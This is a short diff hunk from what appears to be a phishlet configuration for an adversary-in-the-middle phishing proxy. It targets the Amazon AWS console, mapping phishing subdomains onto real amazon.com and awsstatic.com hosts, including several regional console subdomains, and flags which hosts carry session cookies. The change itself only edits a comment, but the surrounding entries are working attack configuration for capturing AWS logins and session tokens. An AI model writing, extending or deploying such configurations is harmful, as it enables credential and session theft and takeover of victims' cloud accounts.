@@ -11,7 +11,8 @@ proxy_hosts:
   - {phish_sub: 'phd.aws', orig_sub: 'phd.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'console.aws', orig_sub: 'console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'a.b.cdn.console', orig_sub: 'a.b.cdn.console', domain: 'awsstatic.com', session: true, is_landing: false, auto_filter: true}
-## subdomains updated
+
+# subdomains updated (based on configuration)
   - {phish_sub: 'us-east-1.console.aws', orig_sub: 'us-east-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'us-east-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}  
   - {phish_sub: 'us-west-1.console.aws', orig_sub: 'us-west-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}  
